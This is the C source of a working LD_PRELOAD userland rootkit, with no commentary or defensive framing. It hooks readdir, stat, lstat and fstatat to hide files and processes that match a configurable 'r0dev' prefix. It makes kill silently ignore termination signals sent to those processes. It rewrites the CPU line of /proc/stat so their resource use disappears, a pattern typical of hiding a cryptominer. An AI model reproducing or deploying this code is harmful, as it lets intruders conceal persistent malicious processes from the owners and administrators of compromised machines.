#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <stdarg.h>

#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif

static char PREFIX[64] = "r0dev";

static struct dirent *(*real_readdir)(DIR *) = NULL;
static struct dirent64 *(*real_readdir64)(DIR *) = NULL;
static int (*real_kill)(pid_t, int) = NULL;
static int (*real_open)(const char *, int, ...) = NULL;
static int (*real_openat)(int, const char *, int, ...) = NULL;
static ssize_t (*real_read)(int, void *, size_t) = NULL;
static FILE *(*real_fopen)(const char *, const char *) = NULL;
static ssize_t (*real_readlink)(const char *, char *, size_t) = NULL;
static int (*real_stat)(const char *, struct stat *) = NULL;
static int (*real_lstat)(const char *, struct stat *) = NULL;
static int (*real_fstatat)(int, const char *, struct stat *, int) = NULL;

static int has_prefix(const char *s) {
    if (!s || !*PREFIX) return 0;
    size_t plen = strlen(PREFIX);
    while (*s) {
        if ((*s | 32) == (PREFIX[0] | 32)) {
            if (strncasecmp(s, PREFIX, plen) == 0)
                return 1;
        }
        s++;
    }
    return 0;
}

static int pid_has_prefix(int pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) return 0;
    char buf[256] = {0};
    real_read(fd, buf, sizeof(buf) - 1);
    close(fd);
    return has_prefix(buf);
}

static long cach_ut = 0, cach_st = 0;
static time_t cach_time = 0;

static void refresh_cache(void) {
    cach_ut = cach_st = 0;
    DIR *d = opendir("/proc");
    if (!d) return;
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        char *end;
        long pid = strtol(e->d_name, &end, 10);
        if (*end != '\0' || pid <= 0) continue;
        if (!pid_has_prefix((int)pid)) continue;
        char path[64];
        snprintf(path, sizeof(path), "/proc/%ld/stat", pid);
        int fd = real_open(path, O_RDONLY);
        if (fd < 0) continue;
        char buf[512] = {0};
        real_read(fd, buf, sizeof(buf) - 1);
        close(fd);
        long u, s;
        if (sscanf(buf, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %lu %lu", &u, &s) >= 2) {
            cach_ut += u; cach_st += s;
        }
    }
    closedir(d);
    cach_time = time(NULL);
}

static char *get_modified_stat(void) {
    time_t now = time(NULL);
    if (now - cach_time > 5) refresh_cache();

    int fd = real_open("/proc/stat", O_RDONLY);
    if (fd < 0) return NULL;
    char *buf = malloc(16384);
    if (!buf) { close(fd); return NULL; }
    int n = real_read(fd, buf, 16383);
    close(fd);
    if (n <= 0) { free(buf); return NULL; }
    buf[n] = 0;

    if (cach_ut + cach_st > 0) {
        char *cpu_line = strstr(buf, "cpu ");
        if (cpu_line && (cpu_line == buf || cpu_line[-1] == '\n')) {
            long u, ns, s, i, w, x, y, z;
            if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
                       &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
                u -= cach_ut; if (u < 0) u = 0;
                s -= cach_st; if (s < 0) s = 0;
                char newline[256];
                int nl = snprintf(newline, sizeof(newline),
                    "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
                memcpy(cpu_line, newline, nl);
            }
        }
    }
    return buf;
}

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real_readdir(dirp)) != NULL) {
        if (has_prefix(e->d_name)) continue;
        if (e->d_type == DT_DIR) {
            char *end;
            long pid = strtol(e->d_name, &end, 10);
            if (*end == '\0' && pid > 0 && pid_has_prefix((int)pid))
                continue;
        }
        break;
    }
    return e;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!real_readdir64) real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = real_readdir64(dirp)) != NULL) {
        if (has_prefix(e->d_name)) continue;
        if (e->d_type == DT_DIR) {
            char *end;
            long pid = strtol(e->d_name, &end, 10);
            if (*end == '\0' && pid > 0 && pid_has_prefix((int)pid))
                continue;
        }
        break;
    }
    return e;
}

int open(const char *path, int flags, ...) {
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (strcmp(path, "/proc/stat") == 0 && !(flags & O_WRONLY)) {
        char *content = get_modified_stat();
        if (content) {
            int fd = syscall(SYS_memfd_create, ".stat", 0);
            if (fd >= 0) {
                write(fd, content, strlen(content));
                lseek(fd, 0, SEEK_SET);
                free(content);
                return fd;
            }
            free(content);
        }
    }
    mode_t m = 0;
    if (flags & O_CREAT) { va_list ap; va_start(ap, flags); m = va_arg(ap, mode_t); va_end(ap); }
    return real_open(path, flags, m);
}

int openat(int dirfd, const char *path, int flags, ...) {
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
    if (strcmp(path, "/proc/stat") == 0 && !(flags & O_WRONLY)) {
        char *content = get_modified_stat();
        if (content) {
            int fd = syscall(SYS_memfd_create, ".stat", 0);
            if (fd >= 0) {
                write(fd, content, strlen(content));
                lseek(fd, 0, SEEK_SET);
                free(content);
                return fd;
            }
            free(content);
        }
    }
    mode_t m = 0;
    if (flags & O_CREAT) { va_list ap; va_start(ap, flags); m = va_arg(ap, mode_t); va_end(ap); }
    return real_openat(dirfd, path, flags, m);
}

FILE *fopen(const char *path, const char *mode) {
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    if (strcmp(path, "/proc/stat") == 0 && mode[0] == 'r') {
        time_t now = time(NULL);
        if (now - cach_time > 5) refresh_cache();

        FILE *f = real_fopen(path, mode);
        if (!f) return f;

        char buf[8192];
        size_t n = fread(buf, 1, sizeof(buf) - 1, f);
        buf[n] = 0;

        if (cach_ut + cach_st > 0) {
            char *cpu_line = strstr(buf, "cpu ");
            if (cpu_line && (cpu_line == buf || cpu_line[-1] == '\n')) {
                long u, ns, s, i, w, x, y, z;
                if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
                           &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
                    u -= cach_ut; if (u < 0) u = 0;
                    s -= cach_st; if (s < 0) s = 0;
                    char nl[256];
                    int nlen = snprintf(nl, sizeof(nl),
                        "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
                    memcpy(cpu_line, nl, nlen);
                }
            }
        }

        fclose(f);
        FILE *tmp = tmpfile();
        if (tmp) { fwrite(buf, 1, strlen(buf), tmp); rewind(tmp); return tmp; }
        return NULL;
    }
    return real_fopen(path, mode);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");
    if (!real_readlink) real_readlink = dlsym(RTLD_NEXT, "readlink");

    ssize_t ret = real_read(fd, buf, count);
    if (ret <= 0) return ret;

    char link[256] = {0};
    char proc_fd[64];
    snprintf(proc_fd, sizeof(proc_fd), "/proc/self/fd/%d", fd);
    if (real_readlink(proc_fd, link, sizeof(link)) > 0) {
        if (strstr(link, "/proc/stat")) {
            time_t now = time(NULL);
            if (now - cach_time > 5) refresh_cache();

            if (cach_ut + cach_st > 0) {
                char *data = (char *)buf;
                char *cpu_line = strstr(data, "cpu ");
                if (cpu_line && ret > 6) {
                    long u, ns, s, i, w, x, y, z;
                    if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
                               &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
                        u -= cach_ut; if (u < 0) u = 0;
                        s -= cach_st; if (s < 0) s = 0;
                        char nb[256];
                        int nl = snprintf(nb, sizeof(nb),
                            "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
                        memcpy(cpu_line, nb, nl < ret ? nl : ret);
                    }
                }
            }
        }
    }
    return ret;
}

int kill(pid_t pid, int sig) {
    if (!real_kill) real_kill = dlsym(RTLD_NEXT, "kill");
    if ((sig == SIGKILL || sig == SIGTERM) && pid > 0 && pid_has_prefix(pid))
        return 0;
    return real_kill(pid, sig);
}

int stat(const char *path, struct stat *buf) {
    if (!real_stat) real_stat = dlsym(RTLD_NEXT, "stat");
    if (has_prefix(path)) { errno = ENOENT; return -1; }
    return real_stat(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    if (!real_lstat) real_lstat = dlsym(RTLD_NEXT, "lstat");
    if (has_prefix(path)) { errno = ENOENT; return -1; }
    return real_lstat(path, buf);
}

int fstatat(int dirfd, const char *path, struct stat *buf, int flags) {
    if (!real_fstatat) real_fstatat = dlsym(RTLD_NEXT, "fstatat");
    if (has_prefix(path)) { errno = ENOENT; return -1; }
    return real_fstatat(dirfd, path, buf, flags);
}

static void read_prefix_from_env(void) {
    char *env = getenv("R0DEV_PREFIX");
    if (env && *env) {
        size_t len = strlen(env);
        if (len >= sizeof(PREFIX)) len = sizeof(PREFIX) - 1;
        memcpy(PREFIX, env, len);
        PREFIX[len] = 0;
    }
}

static void __attribute__((constructor)) init(void) {
    read_prefix_from_env();
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    real_kill = dlsym(RTLD_NEXT, "kill");
    real_open = dlsym(RTLD_NEXT, "open");
    real_openat = dlsym(RTLD_NEXT, "openat");
    real_read = dlsym(RTLD_NEXT, "read");
    real_fopen = dlsym(RTLD_NEXT, "fopen");
    real_readlink = dlsym(RTLD_NEXT, "readlink");
    real_stat = dlsym(RTLD_NEXT, "stat");
    real_lstat = dlsym(RTLD_NEXT, "lstat");
    real_fstatat = dlsym(RTLD_NEXT, "fstatat");
}
